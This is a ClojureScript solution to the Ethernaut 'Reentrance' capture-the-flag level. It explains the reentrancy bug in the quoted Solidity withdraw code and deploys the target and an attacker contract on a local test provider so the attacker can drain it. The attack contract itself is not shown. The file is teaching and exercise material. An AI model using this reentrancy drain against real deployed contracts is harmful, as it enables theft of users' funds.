(ns ctf.ethernaut.reentrance
  "The Rentrance contract has the most infamous
  vulnerability in the ETH ecosystem (see DAO hack).

  This is the solidity code of interest.

  if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}('');
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }

  As we see that the msg.sender can `receive` the amount
  first. Before it gets reduced from the balances map.

  The receiver (msg.sender), one who calls withdraw, to
  exploit can call the withdraw in its `receive` function.
  The checks that balances[msg.sender] >= _amount
  will always pass in this case. The account, with such a
  `receive` function can drain the Reentrance contract
  until there is no more balance left."
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]]))



(def player (w/get-player! w/local-provider))


(defn deploy-reentrance!
  "Deploys the target contract that 'player' needs to attack!
   Returns the `js/Promise`."
  []
  (let [contract (u/contract :reentrance
                             w/local-wallet)]
    (.deploy contract)))


(defn deploy-attacker!
  "Player deployes the attacker contract to
  exploit the reentrance bug"
  [target-addr]
  (let [contract (u/contract :reentrance/attacker player)
        tx (js-obj "value" (u/eth-str->wei "0.005"))]
    (.deploy contract
             target-addr
             tx)))



(defn reentrancy-attack
  []
  (a/go
    (try
      (let [reentrance (<p! (deploy-reentrance!))
            ;; Sends donation to the Rentrance contract
            attacker   (<p! (deploy-attacker! (.-address reentrance)))
            ;; Start withdrawing
            _ (<p! (.withdraw attacker (u/eth-str->wei "0.001")))]
        (<p!
         (.getBalance
          w/local-provider
          (.-address reentrance))))
      (catch js/Error err
        (js/console.log (ex-cause err))))))


(comment

  ;; Execute this code to launch attack!
  (reentrancy-attack)

  (do
    (u/compile-all!)

    (def reentrance (atom ""))
    (def attacker (atom ""))

    (.then (deploy-reentrance!)
           #(reset! reentrance %))
    )


    ;; check balance of the contract
    (.then (.getBalance w/local-provider
                        (.-address @reentrance))
           #(.log js/console %))


    (.then (deploy-attacker! (.-address @reentrance))
           #(reset! attacker %))


    (.then (.withdraw @attacker (u/eth-str->wei "0.001"))
           #(.log js/console %))


  )
